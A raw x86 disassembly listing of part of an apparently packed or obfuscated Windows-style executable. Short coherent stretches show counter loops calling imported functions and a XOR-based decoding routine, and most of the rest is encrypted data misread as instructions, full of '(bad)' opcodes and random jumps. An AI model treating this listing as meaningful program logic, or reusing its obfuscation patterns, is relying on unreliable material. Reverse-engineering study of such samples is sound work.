  406feb:	jne    0x406ffe
  406ff1:	mov    ecx,DWORD PTR ds:0x42a885
  406ff7:	inc    ecx
  406ff8:	mov    DWORD PTR ds:0x42a885,ecx
  406ffe:	jmp    0x406fa3
  407003:	adc    DWORD PTR ds:0x42a7c9,edx
  407009:	mov    DWORD PTR [ebp-0xc],eax
  40700c:	xor    ecx,ecx
  40700e:	add    ecx,DWORD PTR ds:0x42a76d
  407014:	sub    DWORD PTR ds:0x42a841,ecx
  40701a:	jmp    0x407323
  40701f:	cmp    al,0xc4
  407021:	(bad)  
  407022:	rcl    dh,cl
  407024:	rol    ah,cl
  407026:	ficom  DWORD PTR [esi+ebp*2-0xc]
  40702a:	out    0x89,al
  40702c:	out    0xf0,eax
  40702e:	in     al,0x58
  407030:	int3   
  407031:	js     0x4070ab
  407033:	fs jle 0x4070ae
  407036:	js     0x407050
  407038:	add    eax,0x9df2da15
  40703d:	push   eax
  40703e:	cmp    BYTE PTR [edx+0x692805f2],bh
  407044:	jne    0x407087
  407046:	and    edi,esi
  407048:	pop    ds
  407049:	pop    eax
  40704a:	enter  0x89d5,0xc0
  40704e:	rcl    DWORD PTR [ebx-0x63],cl
  407051:	sti    
  407052:	cld    
  407053:	sub    al,0xc6
  407055:	sbb    DWORD PTR [ebx-0x39],esi
  407058:	xchg   edi,eax
  407059:	xchg   edx,eax
  40705a:	les    esp,FWORD PTR [esi+0x7e2657e7]
  407060:	inc    eax
  407061:	imul   BYTE PTR [esi]
  407063:	inc    esi
  407064:	add    al,0xd5
  407066:	xor    eax,0xdf211e1e
  40706b:	loop   0x407019
  40706d:	sbb    bl,ah
  40706f:	pop    ds
  407070:	and    edx,0xffffffe5
  407073:	repnz arpl ax,bx
  407076:	lahf   
  407077:	and    al,0x53
  407079:	in     al,dx
  40707a:	clc    
  40707b:	adc    BYTE PTR [ebx+0xc3ec20],ch
  407081:	xor    BYTE PTR [eax+0x1509c995],ah
  407087:	inc    ebx
  407088:	loope  0x40707c
  40708a:	lods   eax,DWORD PTR ds:[esi]
  40708b:	in     eax,0x55
  40708d:	cdq    
  40708e:	xchg   esp,eax
  40708f:	fimul  WORD PTR [esi+0x65]
  407092:	icebp  
  407093:	add    ecx,edi
  407095:	retf   0x5ec1
  407098:	data16 hlt 
  40709a:	or     eax,DWORD PTR [ebx+0x27]
  40709d:	popf   
  40709e:	jg     0x407047
  4070a0:	inc    edx
  4070a1:	popf   
  4070a2:	mov    eax,ds:0x1b41fea5
  4070a7:	push   ds
  4070a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070a9:	pop    edi
  4070aa:	cmp    ah,al
  4070ac:	scas   al,BYTE PTR es:[edi]
  4070ad:	fisubr WORD PTR [edx-0x35]
  4070b0:	ja     0x40705b
  4070b2:	loope  0x4070d4
  4070b4:	xor    esi,edx
  4070b6:	popa   
  4070b7:	es test ah,dl
  4070ba:	push   ebp
  4070bb:	inc    eax
  4070bc:	pop    eax
  4070bd:	xor    al,0x52
  4070bf:	xchg   edx,eax
  4070c0:	jmp    0x4d37:0xe38d51b2
  4070c7:	push   ecx
  4070c8:	cmp    DWORD PTR ds:[eax-0x46878690],eax
  4070cf:	jno    0x4070b1
  4070d1:	pop    ebp
  4070d2:	fwait
  4070d3:	mov    dh,0xd3
  4070d5:	in     al,dx
  4070d6:	jmp    0xd54d:0x6c105c84
  4070dd:	fst    DWORD PTR [esi]
  4070df:	out    0x3e,al
  4070e1:	jge    0x40709c
  4070e3:	inc    edx
  4070e4:	jo     0x407137
  4070e6:	repnz out 0xd3,eax
  4070e9:	xchg   esi,eax
  4070ea:	jae    0x4070c2
  4070ec:	sbb    al,0x2c
  4070ee:	call   0x260bb3a0
  4070f3:	fst    DWORD PTR ds:0xd61546aa
  4070f9:	hlt    
  4070fa:	inc    edi
  4070fb:	and    esp,DWORD PTR [ebx+0x59f64e28]
  407101:	jo     0x407116
  407103:	mov    bl,0x89
  407105:	and    al,0x14
  407107:	mov    dh,0xec
  407109:	stc    
  40710a:	cmp    bh,BYTE PTR [eax+0x306a15d]
  407110:	jge    0x4070e4
  407112:	sbb    esi,DWORD PTR [edx]
  407114:	test   al,0x7
  407116:	test   eax,0x120c8544
  40711b:	cdq    
  40711c:	jecxz  0x40716f
  40711e:	prefetchnta BYTE PTR [ebx+0x7fdaf648]
  407125:	popf   
  407126:	xor    eax,0x8f1dbf4
  40712b:	es push esp
  40712d:	mov    esp,0x38c4748f
  407132:	mov    dh,BYTE PTR [eax-0x7de7345a]
  407138:	pushf  
  407139:	push   0x80076a59
  40713e:	adc    BYTE PTR [edi-0x54f1db63],cl
  407144:	mov    eax,0x7409aaea
  407149:	out    0xe8,al
  40714b:	mov    edx,edi
  40714d:	and    eax,0xe46aa247
  407152:	or     BYTE PTR [edi-0x68],0xa
  407156:	ins    BYTE PTR es:[edi],dx
  407157:	lock push cs
  407159:	es hlt 
  40715b:	jg     0x407176
  40715d:	ret    0x2585
  407160:	mov    dl,0x60
  407162:	outs   dx,DWORD PTR ds:[esi]
  407163:	sbb    eax,esi
  407165:	lahf   
  407166:	jb     0x407148
  407168:	lds    esp,FWORD PTR [edi]
  40716a:	and    esi,DWORD PTR es:[eax-0x48]
  40716e:	in     eax,0x92
  407170:	pop    esp
  407171:	jmp    0x9b2cd62f
  407176:	arpl   dx,cx
  407178:	inc    edx
  407179:	cmp    bl,bl
  40717b:	pop    ebp
  40717c:	fsub   DWORD PTR [edx-0x43]
  40717f:	inc    edi
  407180:	jge    0x407177
  407182:	shr    BYTE PTR [edx+0x208679d7],cl
  407188:	xchg   edi,eax
  407189:	data16 add BYTE PTR [ebp+edi*2+0xe],dh
  40718e:	mov    ds:0xf49953f1,eax
  407193:	add    ecx,ebx
  407195:	mov    eax,0x53318866
  40719a:	outs   dx,DWORD PTR ss:[esi]
  40719c:	cmp    edx,DWORD PTR [esi]
  40719e:	pop    edx
  40719f:	clc    
  4071a0:	sbb    BYTE PTR [eax],al
  4071a2:	int3   
  4071a3:	xchg   esp,eax
  4071a4:	(bad)  
  4071a5:	fld    QWORD PTR [edx+0x280ea27e]
  4071ab:	lds    edx,FWORD PTR [ebx+edi*4+0x1c]
  4071af:	ss mov ch,0x22
  4071b2:	addr16 ret 0xc737
  4071b6:	or     cl,bl
  4071b8:	lds    eax,FWORD PTR [edx]
  4071ba:	rol    ebp,cl
  4071bc:	and    al,0xee
  4071be:	jmp    0x992d:0xcc6f6f69
  4071c5:	pop    eax
  4071c6:	xchg   edx,eax
  4071c7:	push   esi
  4071c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071c9:	ins    DWORD PTR es:[edi],dx
  4071ca:	clc    
  4071cb:	cld    
  4071cc:	outs   dx,DWORD PTR ds:[esi]
  4071cd:	sahf   
  4071ce:	lahf   
  4071cf:	jmp    0xde5f9f54
  4071d4:	or     ah,BYTE PTR [eax]
  4071d6:	out    dx,al
  4071d7:	jo     0x40721f
  4071d9:	stos   BYTE PTR es:[edi],al
  4071da:	push   edi
  4071db:	add    esp,DWORD PTR [eax+0x7aa1b64d]
  4071e1:	loope  0x40721b
  4071e3:	das    
  4071e4:	jb     0x4071c5
  4071e6:	hlt    
  4071e7:	jle    0x40722a
  4071e9:	adc    al,0xac
  4071eb:	xor    DWORD PTR [edi-0x5a],esi
  4071ee:	xchg   esp,eax
  4071ef:	inc    eax
  4071f0:	xchg   edi,eax
  4071f1:	sbb    al,0xb5
  4071f3:	cmp    edi,esi
  4071f5:	cmp    DWORD PTR [eax],0xbabb45de
  4071fb:	and    al,0x62
  4071fd:	mov    eax,ds:0x267d845a
  407202:	pop    ebx
  407203:	fimul  WORD PTR [ebx]
  407205:	push   esi
  407206:	xlat   BYTE PTR ds:[ebx]
  407207:	cmp    ch,BYTE PTR [edx+ecx*8+0x1f]
  40720b:	lods   al,BYTE PTR ds:[esi]
  40720c:	test   edi,ecx
  40720e:	stc    
  40720f:	xchg   ebp,eax
  407210:	mov    ebp,0xfd9db53b
  407215:	push   cs
  407216:	fadd   DWORD PTR [eax+0x58]
  407219:	pop    ebp
  40721a:	xchg   esi,eax
  40721b:	inc    eax
  40721c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40721d:	data16 mov dl,0x24
  407220:	(bad)  
  407221:	jbe    0x40728c
  407223:	out    0xf6,al
  407225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407226:	pop    ebp
  407227:	jns    0x4072a2
  407229:	xor    al,0x6d
  40722b:	mov    ebx,0x39d3644
  407230:	rep stos BYTE PTR es:[edi],al
  407232:	inc    edx
  407233:	inc    eax
  407234:	add    eax,0xb1e9a2cb
  407239:	retf   0xe194
  40723c:	pop    ss
  40723d:	out    0x55,eax
  40723f:	scas   eax,DWORD PTR es:[edi]
  407240:	mov    esi,ebp
  407242:	rol    DWORD PTR [edx],cl
  407244:	pop    edx
  407245:	and    al,0x3e
  407247:	in     al,dx
  407248:	jne    0x4071f4
  40724a:	in     al,dx
  40724b:	sub    BYTE PTR [edx],bl
  40724d:	jns    0x4071ff
  40724f:	dec    eax
  407250:	dec    esp
  407251:	sub    edi,DWORD PTR [ebp+ecx*1+0x57]
  407255:	xchg   ebp,eax
  407256:	cli    
  407257:	mov    eax,gs:0x51a1ebbb
  40725d:	adc    eax,0xa2c19fd5
  407262:	repz push 0x4053c643
  407268:	ret    
  407269:	adc    dl,BYTE PTR [ebx+0x56efcb4b]
  40726f:	xchg   DWORD PTR [eax],eax
  407271:	jmp    0xba2f:0x4028e645
  407278:	rcl    edx,cl
  40727a:	cli    
  40727b:	cli    
  40727c:	(bad)  
  40727d:	mov    al,0xcf
  40727f:	or     esi,DWORD PTR [ebp+0xc886543]
  407285:	push   0x405f9b00
  40728a:	loop   0x407270
  40728c:	xchg   ebx,eax
  40728d:	in     al,dx
  40728e:	inc    esp
  40728f:	adc    DWORD PTR [edx],esp
  407291:	mov    dh,0xc8
  407293:	mov    bl,0x9
  407295:	mov    ch,0xcf
  407297:	inc    ebx
  407298:	mov    ebp,0x483f7d8
  40729d:	ret    0xfc07
  4072a0:	bound  edi,QWORD PTR [esi-0x34b53b4c]
  4072a6:	fldenv [esi+edi*8-0x73cee4af]
  4072ad:	retf   0x8c55
  4072b0:	dec    ecx
  4072b1:	dec    edi
  4072b2:	mov    esp,0x4913454b
  4072b7:	mov    ch,dl
  4072b9:	push   ds
  4072ba:	pop    edi
  4072bb:	and    dl,dl
  4072bd:	mov    esp,DWORD PTR [ebp-0x2a]
  4072c0:	jne    0x407309
  4072c2:	dec    ebx
  4072c3:	paddsw mm2,mm2
  4072c6:	leave  
  4072c7:	add    edx,DWORD PTR [esi-0x3b]
  4072ca:	and    ah,BYTE PTR ds:0xda129a79
  4072d0:	shr    DWORD PTR [eax-0x75d39f2e],cl
  4072d6:	stos   BYTE PTR es:[edi],al
  4072d7:	jno    0x4072e5
  4072d9:	in     eax,dx
  4072da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072db:	mov    eax,ds:0x1b28050d
  4072e0:	xlat   BYTE PTR ds:[ebx]
  4072e1:	add    al,0xea
  4072e3:	pop    edx
  4072e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072e5:	push   ecx
  4072e6:	jle    0x40734f
  4072e8:	jo     0x4072b4
  4072ea:	pop    ss
  4072eb:	ja     0x407315
  4072ed:	push   ebp
  4072ee:	sbb    BYTE PTR [edx],cl
  4072f0:	sub    eax,0x15b722ab
  4072f5:	xor    dl,bh
  4072f7:	and    ah,bl
  4072f9:	xchg   edi,eax
  4072fa:	inc    ecx
  4072fb:	ror    DWORD PTR [edi-0xcb350be],0xd6
  407302:	retf   0x3360
  407305:	fcom   DWORD PTR [esi+esi*4]
  407308:	xchg   ebp,eax
  407309:	and    BYTE PTR [ebp+0x5b02af9],dl
  40730f:	fnstenv [esi]
  407311:	stc    
  407312:	rol    eax,0x15
  407315:	jge    0x40734f
  407317:	adc    BYTE PTR [ecx-0x3e7c186b],bh
  40731d:	(bad)  
  40731e:	xor    al,BYTE PTR [ebx+edi*8]
  407321:	div    DWORD PTR [esi+eax*8]
  407324:	inc    ebp
  407325:	(bad)  
  407326:	jg     0x4072b5
  407328:	inc    ebp
  407329:	inc    DWORD PTR [ecx+0x42a77925]
  40732f:	add    BYTE PTR [eax],al
  407331:	add    BYTE PTR [eax],al
  407333:	add    cl,ch
  407335:	or     eax,0x8b000000
  40733a:	or     eax,0x42a779
  40733f:	inc    ecx
  407340:	mov    DWORD PTR ds:0x42a779,ecx
  407346:	cmp    DWORD PTR ds:0x42a779,0x14
  40734d:	jae    0x4076a2
  407353:	cmp    DWORD PTR ds:0x42a779,0x4
  40735a:	jne    0x407378
  407360:	push   0x42a889
  407365:	push   0x360b
  40736a:	push   DWORD PTR [ebp-0x20]
  40736d:	push   0x8b40
  407372:	call   DWORD PTR ds:0x41d194
  407378:	cmp    DWORD PTR ds:0x42a779,0x3
  40737f:	jne    0x407394
  407385:	xor    ecx,ecx
  407387:	xor    ecx,DWORD PTR ds:0x42a779
  40738d:	inc    ecx
  40738e:	mov    DWORD PTR ds:0x42a779,ecx
  407394:	jmp    0x407339
  407399:	jmp    0x4076a2
  40739e:	iret   
  40739f:	retf   0xced7
  4073a2:	(bad)  
  4073a4:	aad    0xc9
  4073a6:	in     eax,0x5e
  4073a8:	mov    DWORD PTR ds:0xf4a8075e,esp
  4073ae:	inc    esp
  4073af:	sar    DWORD PTR [eax+0x78],1
  4073b2:	fs jle 0x40742d
  4073b5:	js     0x40736c
  4073b7:	adc    al,BYTE PTR [ecx+0x350c1765]
  4073bd:	lods   eax,DWORD PTR ds:[esi]
  4073bf:	sbb    BYTE PTR [ecx],bl
  4073c1:	outs   dx,DWORD PTR ds:[esi]
  4073c2:	push   ebx
  4073c3:	jl     0x4073f0
  4073c5:	mov    dh,0x77
  4073c7:	sbb    dh,al
  4073c9:	icebp  
  4073ca:	hlt    
  4073cb:	sti    
  4073cc:	or     ecx,esp
  4073ce:	push   es
  4073cf:	out    0xe7,al
  4073d1:	ins    BYTE PTR es:[edi],dx
  4073d2:	sbb    al,0x25
  4073d4:	gs in  al,0x6d
  4073d7:	adc    BYTE PTR [ebx-0x38ba7a8c],ch
  4073dd:	retf   
  4073de:	and    eax,0xde1c4f10
  4073e3:	mov    ebx,0x76163c14
  4073e8:	sbb    DWORD PTR [edx-0x72],edx
  4073eb:	lahf   
  4073ec:	dec    esi
  4073ed:	mov    ebp,0xccdc0a13
  4073f2:	iret   
  4073f3:	push   0x6dcb94b3
  4073f8:	inc    esi
  4073f9:	es xor al,0xcd
  4073fc:	(bad)  
  4073fd:	(bad)  
  4073ff:	push   es
  407400:	xor    eax,0x886a8020
  407405:	arpl   si,dx
  407407:	jecxz  0x407467
  407409:	loope  0x40739e
  40740b:	mov    edi,0x8fe37098
  407410:	or     al,BYTE PTR [eax]
  407412:	sar    BYTE PTR [ebp+edx*8+0x2328b72f],1
  407419:	jae    0x4073b7
  40741b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40741c:	sbb    eax,0x6db7af9a
  407421:	outs   dx,BYTE PTR ds:[esi]
  407422:	mov    eax,0x4e702e60
  407427:	fcom   DWORD PTR [esi]
  407429:	sbb    ecx,ebx
  40742b:	stos   BYTE PTR es:[edi],al
  40742c:	jne    0x407419
  40742e:	sub    eax,0xbff824d9
  407433:	arpl   bx,dx
  407435:	int3   
  407436:	or     edi,edx
  407438:	and    BYTE PTR [eax],0x7a
  40743b:	adc    DWORD PTR [eax-0x62385127],esp
  407441:	mov    ch,0xd1
  407443:	iret   
  407444:	ret    
  407445:	xor    al,0x2d
  407447:	fucomp st(6)
  407449:	adc    edi,DWORD PTR [ebx-0x4df7c44e]
  40744f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407450:	dec    esp
  407451:	clc    
  407452:	push   ds
  407453:	add    al,0x24
  407455:	or     eax,0x8f959cb7
  40745a:	shld   DWORD PTR ds:0x671fb394,ebx,cl
  407461:	retf   
  407462:	and    al,0x26
  407464:	inc    edx
  407465:	loopne 0x4074e5
  407467:	bound  esp,QWORD PTR [edi+edi*4-0x5ecc63f4]
  40746e:	push   ebp
  40746f:	or     ebx,DWORD PTR [ebp+0x4]
  407472:	sub    al,0xee
  407474:	jge    0x4074aa
  407476:	sub    DWORD PTR [ecx-0x23d5b2be],0x3df95170
  407480:	cs cmp edi,0x9431c52c
  407487:	jmp    0xab01:0x4a70119
  40748e:	rcl    DWORD PTR [edx+ebp*2],0x79
  407492:	ds push eax
  407494:	push   es
  407495:	mov    esi,0xb07753be
  40749a:	ret    0x1540
  40749d:	inc    edx
  40749e:	lahf   
  40749f:	xor    DWORD PTR [ebp-0x7aedfce],esp
  4074a5:	mov    esp,0x4e88d3b5
  4074aa:	or     al,0xa3
  4074ac:	retf   
  4074ad:	sbb    eax,DWORD PTR [ebx+0x2646e558]
  4074b3:	das    
  4074b4:	dec    ebp
  4074b5:	dec    esi
  4074b6:	daa    
  4074b7:	mov    esp,0x88a8c2cd
  4074bc:	pop    edi
  4074bd:	xchg   ebx,eax
  4074be:	push   esp
  4074bf:	jmp    0x4074c1
  4074c1:	dec    esi
  4074c2:	test   eax,0xd8333090
  4074c7:	cld    
  4074c8:	dec    DWORD PTR [edi+0x63]
  4074cb:	daa    
  4074cc:	arpl   WORD PTR [ebx],sp
  4074ce:	dec    esp
  4074cf:	cmp    eax,0x6df70e57
  4074d4:	sub    DWORD PTR ds:0x9a86e447,eax
  4074da:	lods   al,BYTE PTR ds:[esi]
  4074db:	fwait
  4074dc:	or     BYTE PTR [esi+edi*2+0x36d5f2d2],0x97
  4074e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074e5:	sahf   
  4074e6:	idiv   DWORD PTR [edi]
  4074e8:	cmp    eax,0xd33945df
  4074ed:	ins    DWORD PTR es:[edi],dx
  4074ee:	in     al,dx
  4074ef:	fstp   TBYTE PTR [edi]
  4074f1:	nop
  4074f2:	xchg   esp,eax
  4074f3:	(bad)  
  4074f4:	ffree  st(1)
  4074f6:	mov    esi,0x84a6ebc6
  4074fb:	sub    dh,al
  4074fd:	or     esp,DWORD PTR [edi+0x5a]
  407500:	stos   BYTE PTR es:[edi],al
  407501:	cld    
  407502:	add    BYTE PTR [ebx+esi*4],dl
  407505:	addr16 cld 
  407507:	es int3 
  407509:	ret    0x63e5
  40750c:	aas    
  40750d:	ds or  al,0x33
  407510:	and    DWORD PTR [edx+ebx*1+0x34],ecx
  407514:	fcom   QWORD PTR [edi+0x5f]
  407517:	jg     0x407561
  407519:	outs   dx,DWORD PTR ds:[esi]
  40751a:	jae    0x40753e
  40751c:	jg     0x4074b9
  40751e:	pop    ecx
  40751f:	and    eax,eax
  407521:	sbb    edx,DWORD PTR [ecx]
  407523:	mov    bh,0x15
  407525:	es dec ecx
  407527:	mov    dl,0x16
  407529:	shr    DWORD PTR [ecx+0x15],1
  40752c:	and    eax,esi
  40752e:	(bad)  
  40752f:	xor    DWORD PTR [ebx],ecx
  407531:	add    al,0x9c
  407533:	inc    ecx
  407534:	and    al,0x3e
  407536:	(bad)  
  407537:	aam    0x7c
  407539:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40753a:	fmul   DWORD PTR [esi+0x26576486]
  407540:	pop    esi
  407541:	sub    al,0xc5
  407543:	xchg   DWORD PTR [bx+si],eax
  407546:	ficom  DWORD PTR [esi-0x2f83cb64]
  40754c:	push   edi
  40754d:	fisub  DWORD PTR [edx-0x3c]
  407550:	pushf  
  407551:	pop    ecx
  407552:	jns    0x4074dd
  407554:	repnz int 0x7a
  407557:	xchg   ecx,eax
  407558:	lds    esp,FWORD PTR [edx]
  40755a:	cwde   
  40755b:	das    
  40755c:	sub    al,0x4a
  40755e:	setb   BYTE PTR [esi-0x80]
  407562:	sub    esi,0xd3b51d96
  407568:	or     al,0x72
  40756a:	ins    BYTE PTR es:[edi],dx
  40756b:	stos   DWORD PTR es:[edi],eax
  40756c:	or     al,ah
  40756e:	scas   eax,DWORD PTR es:[edi]
  40756f:	and    ebx,edi
  407571:	dec    ebp
  407572:	enter  0x74be,0x9e
  407576:	mov    ebx,0xa79d9f4f
  40757b:	(bad)  
  40757d:	pop    edx
  40757e:	add    DWORD PTR [ebx],edx
  407580:	inc    ebp
  407581:	dec    ecx
  407582:	ret    
  407583:	in     eax,0x33
  407585:	mov    ch,0xf0
  407587:	sub    bh,0x5a
  40758a:	and    DWORD PTR [esi*1-0x62ebfea0],eax
  407591:	daa    
  407592:	test   eax,0xe37acc09
  407597:	push   ebx
  407598:	neg    BYTE PTR [eax]
  40759a:	xchg   ebp,eax
  40759b:	cmp    esp,DWORD PTR [ecx+0x6e]
  40759e:	dec    esi
  40759f:	sbb    edx,edi
  4075a1:	jb     0x407601
  4075a3:	push   eax
  4075a4:	inc    ebp
  4075a5:	add    DWORD PTR [ecx+esi*1],esi
  4075a8:	shr    ecx,cl
  4075aa:	lds    edi,FWORD PTR [ebx]
  4075ac:	mov    BYTE PTR [ebp+ebp*1-0x64db18a6],ch
  4075b3:	dec    esi
  4075b4:	mov    cl,BYTE PTR [ebx]
  4075b6:	and    ebx,DWORD PTR [eax]
  4075b8:	jl     0x4075ea
  4075ba:	fwait
  4075bb:	iret   
  4075bc:	and    al,0x7e
  4075be:	lods   eax,DWORD PTR ds:[esi]
  4075bf:	jnp    0x4075dc
  4075c1:	mov    esp,eax
  4075c3:	cmp    BYTE PTR [edx+0x16ef0fd1],bh
  4075c9:	cmp    bl,dh
  4075cb:	cmp    DWORD PTR [ebx+ebp*4-0x40284e8e],eax
  4075d2:	dec    eax
  4075d3:	out    0x5b,eax
  4075d5:	pop    edx
  4075d6:	jp     0x4075be
  4075d8:	clc    
  4075d9:	mov    edx,0xe57d1c0b
  4075de:	xchg   ecx,edi
  4075e0:	xchg   edx,eax
  4075e1:	jecxz  0x40756e
  4075e3:	popf   
  4075e4:	inc    ebp
  4075e5:	pop    ss
  4075e6:	jne    0x4075ef
  4075e8:	cdq    
  4075e9:	(bad)  
  4075ea:	sub    eax,0xfe50548
  4075ef:	in     eax,dx
  4075f0:	sbb    bl,BYTE PTR ds:0xb4af4d61
  4075f6:	test   BYTE PTR [ecx],bh
  4075f8:	pop    ebp
  4075f9:	dec    ebp
  4075fa:	fwait
  4075fb:	aam    0x2c
  4075fd:	gs and eax,0x4c100960
  407603:	sbb    DWORD PTR [esi+eax*4],eax
  407606:	push   ebx
  407607:	popa   
  407608:	das    
  407609:	cmp    DWORD PTR [esi],ebx
  40760b:	xor    ecx,esi
  40760d:	push   ecx
  40760e:	les    eax,FWORD PTR [eax]
  407610:	aaa    
  407611:	aam    0x31
  407613:	xchg   ebx,eax
  407614:	inc    esi
  407615:	(bad)  
  407616:	push   ecx
  407617:	test   BYTE PTR [ebx-0x5a416635],bh
  40761d:	js     0x407636
  40761f:	cmp    BYTE PTR [edx-0x1c],bl
  407622:	mov    eax,ds:0xbec35d2f
  407627:	je     0x4075f4
  407629:	mov    dl,0x36
  40762b:	inc    esi
  40762c:	pop    eax
  40762d:	rcr    BYTE PTR [eax-0x1aa12397],0x5f
  407634:	enter  0xd3a0,0xdb
  407638:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407639:	or     eax,0xf1533109
  40763e:	sbb    al,0x12
  407640:	test   DWORD PTR [edx],ebx
  407642:	int    0xb9
  407644:	pop    ds
  407645:	jge    0x407607
  407647:	hlt    
  407648:	add    esp,DWORD PTR [eax-0x7781b91d]
  40764e:	lods   al,BYTE PTR ds:[esi]
  40764f:	rol    DWORD PTR [edi-0x36],cl
  407652:	out    dx,al
  407653:	xchg   esp,eax
  407654:	fldenv [eax+0x1e]
  407657:	data16 jp 0x407601
  40765a:	xchg   edx,eax
  40765b:	push   DWORD PTR [esp+edx*2-0x4f]
  40765f:	ds push 0x931563a
  407665:	loope  0x4075f8
  407667:	dec    ebp
  407668:	test   DWORD PTR ds:0xc96f4ddb,ebx
  40766e:	cwde   
  40766f:	pop    edx
  407670:	loope  0x4076c1
  407672:	and    ebp,DWORD PTR [ebp+0x6e3e4355]
  407678:	test   ecx,ebx
  40767a:	sbb    edx,DWORD PTR [eax-0x4b]
  40767d:	outs   dx,BYTE PTR ds:[esi]
  40767e:	inc    edx
  40767f:	sub    al,0x88
  407681:	mov    ch,0x75
  407683:	pusha  
  407684:	imul   esi,edi,0xffffffc1
  407687:	rcr    edx,cl
  407689:	mov    edx,0x6fdece3e
  40768e:	push   cs
  40768f:	mov    ebx,DWORD PTR [esi+ebx*8]
  407692:	push   es
  407693:	mov    es,WORD PTR [ecx+0x38]
  407696:	ffree  st(0)
  407698:	mov    WORD PTR [edi],gs
  40769a:	adc    BYTE PTR [esi+0x5ca82043],0x4c
  4076a1:	mov    ebp,0x8af04589
  4076a6:	inc    ebp
  4076a7:	inc    DWORD PTR [ecx+0x42a7610d]
  4076ad:	add    al,bh
  4076af:	ins    BYTE PTR es:[edi],dx
  4076b0:	add    BYTE PTR [eax],al
  4076b2:	mov    ecx,DWORD PTR [ebp-0x10]
  4076b5:	xor    al,0x43
  4076b7:	sub    al,0x3b
  4076b9:	sbb    DWORD PTR ds:0x42a83d,0x42a77d
  4076c3:	mov    BYTE PTR [ecx],al
  4076c5:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  4076cc:	and    DWORD PTR ds:0x42a7b9,0x0
  4076d6:	jmp    0x4076e8
  4076db:	mov    ecx,DWORD PTR ds:0x42a7b9
  4076e1:	inc    ecx
  4076e2:	mov    DWORD PTR ds:0x42a7b9,ecx
  4076e8:	cmp    DWORD PTR ds:0x42a7b9,0x12
  4076ef:	jae    0x40772f
  4076f5:	cmp    DWORD PTR ds:0x42a7b9,0xa
  4076fc:	jne    0x407710
  407702:	push   DWORD PTR [ebp-0xc]
  407705:	push   0x84c8
  40770a:	call   DWORD PTR ds:0x41d0c4
  407710:	cmp    DWORD PTR ds:0x42a7b9,0x9
  407717:	jne    0x40772a
  40771d:	mov    ecx,DWORD PTR ds:0x42a7b9
  407723:	inc    ecx
  407724:	mov    DWORD PTR ds:0x42a7b9,ecx
  40772a:	jmp    0x4076db
  40772f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  407736:	mov    eax,DWORD PTR [ebp-0x8]
  407739:	mov    ecx,0x7510850
  40773e:	push   esi
  40773f:	xor    eax,ecx
  407741:	mov    esi,0x327298
  407746:	add    eax,esi
  407748:	jmp    0x407755
  40774d:	mov    dl,BYTE PTR [ebp-0x1]
  407750:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  407754:	inc    eax
  407755:	cmp    eax,0x40
  407758:	jb     0x40774d
  40775e:	mov    edx,DWORD PTR [ebp-0x8]
  407761:	mov    eax,DWORD PTR [ebp-0xc]
  407764:	xor    edx,ecx
  407766:	add    edx,esi
  407768:	cmp    edx,eax
  40776a:	je     0x407dc2
  407770:	push   ebx
  407771:	push   edi
  407772:	mov    edi,DWORD PTR [ebp+0x8]
  407775:	mov    eax,0x8a36
  40777a:	xor    ax,WORD PTR [edi+edx*4+0x2]
  40777f:	mov    edi,0x3afc
  407784:	jmp    0x407a8d
  407789:	cmp    al,0xc2
  40778b:	cmp    al,0xd3
  40778d:	ret    0xd3d1
  407790:	shl    DWORD PTR [edx-0x7a518918],1
  407796:	mov    al,ds:0xd6b091c8
  40779b:	js     0x407815
  40779d:	fs jle 0x407818
  4077a0:	js     0x40775d
  4077a2:	mov    edi,0xd2ffd39b
  4077a7:	fwait
  4077a8:	inc    edx
  4077a9:	mov    ds:0x8dabcf66,eax
  4077ae:	mov    esp,0x99c8938d
  4077b3:	fdivr  st(6),st
  4077b5:	lea    esp,[ebx-0x4aa0374d]
  4077bb:	ret    0x10bb
  4077be:	aad    0xdf
  4077c0:	push   esp
  4077c1:	push   ss
  4077c2:	daa    
  4077c3:	lods   eax,DWORD PTR ds:[esi]
  4077c4:	pop    ss
  4077c5:	mov    ebp,0x524b565
  4077ca:	mov    ecx,0x5c4fa3f0
  4077cf:	xor    bh,BYTE PTR [ebx+0x7e0f8f6a]
  4077d5:	dec    esp
  4077d6:	and    BYTE PTR [eax+0x26],0x4
  4077da:	pushf  
  4077db:	mov    eax,0xa5f97ad3
  4077e0:	test   bl,ah
  4077e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077e3:	dec    edx
  4077e4:	dec    esp
  4077e5:	cmp    bl,BYTE PTR [edi+ebx*2+0x7d]
  4077e9:	sbb    eax,DWORD PTR [ecx+edi*2-0x4f]
  4077ed:	pop    ss
  4077ee:	lea    esi,[edi+0x39]
  4077f1:	cmc    
  4077f2:	fbstp  TBYTE PTR [edx+0x6a722262]
  4077f8:	fwait
  4077f9:	mov    edi,0x21bf2d27
  4077fe:	push   ss
  4077ff:	pop    edx
  407800:	mov    esi,0x843aefbe
  407805:	sub    ah,dl
  407807:	xchg   ebp,eax
  407808:	and    al,0x6
  40780a:	adc    DWORD PTR [eax],ecx
  40780c:	xor    eax,0x23ac82fc
  407811:	jbe    0x407830
  407813:	stos   BYTE PTR es:[edi],al
  407814:	(bad)  
  407815:	enter  0xa0a4,0x2a
  407819:	xchg   edi,eax
  40781a:	je     0x40784f
  40781c:	add    DWORD PTR [esi],edi
  40781e:	retf   0xb3a5
  407821:	adc    dl,0xbd
  407824:	and    eax,0x33ad9b81
  407829:	jne    0x40782d
  40782b:	inc    ecx
  40782c:	fs int3 
  40782e:	in     eax,dx
  40782f:	xchg   esp,eax
  407830:	in     al,dx
  407831:	inc    esp
  407832:	jb     0x4077fe
  407834:	and    al,0xef
  407836:	aad    0x5b
